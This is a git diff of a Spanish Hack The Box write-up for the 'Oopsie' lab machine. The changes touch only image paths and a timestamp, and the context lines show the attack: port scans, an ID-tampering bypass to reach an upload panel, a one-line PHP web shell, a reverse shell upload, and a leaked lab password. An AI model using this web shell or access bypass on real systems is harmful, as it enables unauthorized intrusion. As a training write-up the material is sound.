@@ -1,7 +1,7 @@
 ---
 publish: true
 created: 2026-09-11T12:16:55.944Z
-modified: 2026-09-11T12:24:56.226Z
+modified: 2026-09-11T18:12:57.800Z
 ---
 
 # Oopsie
@@ -32,7 +32,7 @@ Comenzamos con un escaneo para identificar que puertos están abiertos.
 sudo -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.105.138 -oG allports
 ```
 
-![image.png](/images/HackTheBox/image.png)
+![image.png](WriteUps/images/HackTheBox/image.png)
 
 ### **Enumeración de servicios**
 
@@ -44,13 +44,13 @@ Una vez listado los puertos accesibles, procederemos a realizar la enumeración 
 sudo nmap -p22,80 -sCV 10.129.105.138 -oN targeted
 ```
 
-![image.png](/images/HackTheBox/image%201.png)
+![image.png](WriteUps/images/HackTheBox/image 1.png)
 
 - **Identificación de vulnerabilidades**
 
   - 22 SSH: Encotramos clave SSH RSA
 
-  ![image.png](/images/HackTheBox/image%202.png)
+  ![image.png](WriteUps/images/HackTheBox/image 2.png)
 
   - 80
 
@@ -58,18 +58,18 @@ sudo nmap -p22,80 -sCV 10.129.105.138 -oN targeted
   whatweb 10.129.105.138
   ```
 
-![image.png](/images/HackTheBox/image%203.png)
+![image.png](WriteUps/images/HackTheBox/image 3.png)
 
 ```bash
 feroxbuster --url http://10.129.105.138
 
 ```
 
-![image.png](/images/HackTheBox/image%204.png)
+![image.png](WriteUps/images/HackTheBox/image 4.png)
 
 Encontramos ruta : /cdn-cgi/login
 
-![image.png](/images/HackTheBox/image%205.png)
+![image.png](WriteUps/images/HackTheBox/image 5.png)
 
 Al no disponer de credenciales, accedmos como “Guest”
 
@@ -77,7 +77,7 @@ Enumeramos la web :
 
 Account con ID = 2
 
-![image.png](/images/HackTheBox/image%206.png)
+![image.png](WriteUps/images/HackTheBox/image 6.png)
 
 Cambiamos el ID a 1 y encontramos usuario admin con ID: 34322
 
@@ -87,7 +87,7 @@ Mail : john@tafcz.co.uk
 
 Name: Tafcz
 
-![image.png](/images/HackTheBox/image%207.png)
+![image.png](WriteUps/images/HackTheBox/image 7.png)
 
 ## Explotación
 
@@ -100,9 +100,9 @@ Name: Tafcz
 
 Mediante Burpsuite, interceptamos la peticion y cambiamos el id por el 34322 y admin , para acceder al panel “Upload”
 
-![image.png](/images/HackTheBox/image%208.png)
+![image.png](WriteUps/images/HackTheBox/image 8.png)
 
-![image.png](/images/HackTheBox/image%209.png)
+![image.png](WriteUps/images/HackTheBox/image 9.png)
 
 Probamos a subir el una shell para RCE :
 
@@ -110,11 +110,11 @@ Probamos a subir el una shell para RCE :
 <?php echo "<pre>" . system($_GET['cmd']) . "</pre>"; ?>
 ```
 
-![image.png](/images/HackTheBox/image%2010.png)
+![image.png](WriteUps/images/HackTheBox/image 10.png)
 
 Tratamos de acceder:
 
-![image.png](/images/HackTheBox/image%2011.png)
+![image.png](WriteUps/images/HackTheBox/image 11.png)
 
 Tenemos ejecucción remota de comandos
 
@@ -122,7 +122,7 @@ Tratamos de ejecutar una revershell:
 
 Subimos revershell de pentestmonkey y obtenemos revershell
 
-![image.png](/images/HackTheBox/image%2012.png)
+![image.png](WriteUps/images/HackTheBox/image 12.png)
 
 ###
 
@@ -137,13 +137,13 @@ Subimos revershell de pentestmonkey y obtenemos revershell
 
 Una vez accedemos, enumeramos el sistema y encontramos como migrar a usuario robert en db.php
 
-![image.png](/images/HackTheBox/image%2013.png)
+![image.png](WriteUps/images/HackTheBox/image 13.png)
 
 User: robert
 
 Password: M3g4C0rpUs3r!
 
-![image.png](/images/HackTheBox/image%2014.png)
+![image.png](WriteUps/images/HackTheBox/image 14.png)
 
 Buscamos binarios SUID.
 
